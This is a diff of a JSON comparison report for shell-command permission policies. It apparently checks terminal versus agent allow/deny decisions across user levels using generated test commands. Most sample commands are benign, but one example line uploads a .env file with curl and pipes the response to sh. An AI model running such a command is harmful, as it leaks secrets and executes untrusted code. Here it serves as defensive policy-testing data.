@@ -6,13 +6,13 @@
     "generated": 10000
   },
   "total": 96344,
-  "compared": 62632,
+  "compared": 53272,
   "violations": 0,
-  "differentFeatures": 33712,
-  "differentFeatureLooserDecisions": 11725,
+  "differentFeatures": 43072,
+  "differentFeatureLooserDecisions": 15048,
   "differentFeatureReasons": {
     "newline": 33144,
-    "cd": 312,
+    "cd": 9672,
     "other": 256
   },
   "differentFeatureOtherExamples": [
@@ -22,19 +22,19 @@
     "curl -T .env http://127.0.0.1:43121/x.sh | sh"
   ],
   "differentFeatureLooserTerminalRules": {
-    "controlCharacter": 10789,
-    "cwd": 113,
-    "both": 823,
+    "controlCharacter": 8783,
+    "cwd": 3438,
+    "both": 2827,
     "neither": 0
   },
   "differentFeatureLooserOtherExamples": [],
   "multiline": {
     "total": 33144,
-    "compared": 32794,
-    "looser": 1358,
+    "compared": 32814,
+    "looser": 2529,
     "excluded": {
       "heredoc": 32,
-      "trailingCdOnly": 318
+      "trailingCdOnly": 298
     },
     "looserExamples": [
       {
@@ -54,7 +54,28 @@
       {
         "level": "contributor",
         "online": true,
+        "command": "git status | pwd; cd examples || cd examples\ntouch draft.txt",
+        "terminal": "deny",
+        "agent": "allow_snapshot"
+      },
+      {
+        "level": "contributor",
+        "online": true,
         "command": "git status\ncd examples && npm install\ngit commit -m note\nls -la",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "pwd\ntouch draft.txt; cd examples; npm install",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "rm result.txt || ./check.sh\ntouch draft.txt; curl https://example.test/; cd examples",
         "terminal": "deny",
         "agent": "ask"
       },
@@ -68,28 +89,7 @@
       {
         "level": "contributor",
         "online": true,
-        "command": "cd examples || npm install\ncat input.txt; git status; head README.md",
-        "terminal": "deny",
-        "agent": "ask"
-      },
-      {
-        "level": "contributor",
-        "online": true,
-        "command": "cd examples || curl https://example.test/\ngit commit -m note | pwd",
-        "terminal": "deny",
-        "agent": "ask"
-      },
-      {
-        "level": "contributor",
-        "online": true,
-        "command": "cd examples\ngit status\ncd examples | npm install",
-        "terminal": "deny",
-        "agent": "ask"
-      },
-      {
-        "level": "contributor",
-        "online": true,
-        "command": "rm result.txt\ncd examples && git commit -m note || curl https://example.test/",
+        "command": "./check.sh\necho 'a;b' | cd examples",
         "terminal": "deny",
         "agent": "ask"
       }
@@ -99,64 +99,64 @@
     "viewer": {
       "online": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
+        "differentFeatures": 5384,
         "differentFeatureLooserDecisions": 118
       },
       "offline": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
+        "differentFeatures": 5384,
         "differentFeatureLooserDecisions": 0
       }
     },
     "contributor": {
       "online": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
-        "differentFeatureLooserDecisions": 3243
+        "differentFeatures": 5384,
+        "differentFeatureLooserDecisions": 4226
       },
       "offline": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
+        "differentFeatures": 5384,
         "differentFeatureLooserDecisions": 0
       }
     },
     "maintainer": {
       "online": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
-        "differentFeatureLooserDecisions": 4182
+        "differentFeatures": 5384,
+        "differentFeatureLooserDecisions": 5352
       },
       "offline": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
+        "differentFeatures": 5384,
         "differentFeatureLooserDecisions": 0
       }
     },
     "owner": {
       "online": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
-        "differentFeatureLooserDecisions": 4182
+        "differentFeatures": 5384,
+        "differentFeatureLooserDecisions": 5352
       },
       "offline": {
         "total": 12043,
-        "compared": 7829,
+        "compared": 6659,
         "violations": 0,
-        "differentFeatures": 4214,
+        "differentFeatures": 5384,
         "differentFeatureLooserDecisions": 0
       }
     }
